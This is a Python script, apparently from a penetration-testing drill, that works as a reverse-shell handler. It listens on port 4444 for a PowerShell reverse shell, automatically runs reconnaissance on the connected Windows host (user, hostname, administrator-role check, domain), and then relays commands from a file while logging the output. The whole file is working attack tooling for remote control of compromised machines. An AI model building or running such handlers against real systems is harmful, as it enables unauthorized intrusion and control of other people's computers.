"""Reverse-shell handler for the GP-0 payload. Listens on 4444, catches the PowerShell reverse
shell, auto-runs identity recon, then follows commands written to /home/kali/drill/cmd.in and logs
everything to /home/kali/drill/shell.log. Lets the shell be driven over SSH (write cmd.in, read
shell.log) without an interactive TTY. Runs on Kali."""
import socket, time, os, datetime

LOG = "/home/kali/drill/shell.log"
CMDIN = "/home/kali/drill/cmd.in"
PORT = 4444


def log(s: str) -> None:
    with open(LOG, "a") as f:
        f.write(s)


def recv_until_prompt(conn, timeout=10) -> str:
    conn.settimeout(0.5)
    data, end = "", time.time() + timeout
    while time.time() < end:
        try:
            chunk = conn.recv(4096).decode("latin-1", "replace")
            if not chunk:
                break
            data += chunk
            end = time.time() + 1.2
            if data.rstrip().endswith(">"):
                break
        except socket.timeout:
            if data:
                break
    return data


def send_cmd(conn, cmd: str) -> None:
    conn.sendall((cmd + "\n").encode())
    out = recv_until_prompt(conn)
    log(f"\n$ {cmd}\n{out}\n")


def main() -> None:
    open(CMDIN, "a").close()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(("0.0.0.0", PORT)); s.listen(1)
    log(f"\n==== listener up {datetime.datetime.now():%H:%M:%S} ====\n")
    conn, addr = s.accept()
    log(f"\n==== SHELL CONNECTED from {addr} at {datetime.datetime.now():%H:%M:%S} ====\n")
    time.sleep(0.6)
    log("[banner] " + recv_until_prompt(conn) + "\n")
    for c in ["whoami",
              "hostname",
              "[System.Security.Principal.WindowsIdentity]::GetCurrent().Name",
              "([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)",
              "$env:USERDNSDOMAIN"]:
        send_cmd(conn, c)
    pos = os.path.getsize(CMDIN)
    while True:
        time.sleep(1)
        try:
            sz = os.path.getsize(CMDIN)
            if sz > pos:
                with open(CMDIN) as f:
                    f.seek(pos); new = f.read(); pos = sz
                for line in new.splitlines():
                    if line.strip():
                        send_cmd(conn, line.strip())
        except Exception as e:
            log(f"[cmdin err] {e}\n")


main()
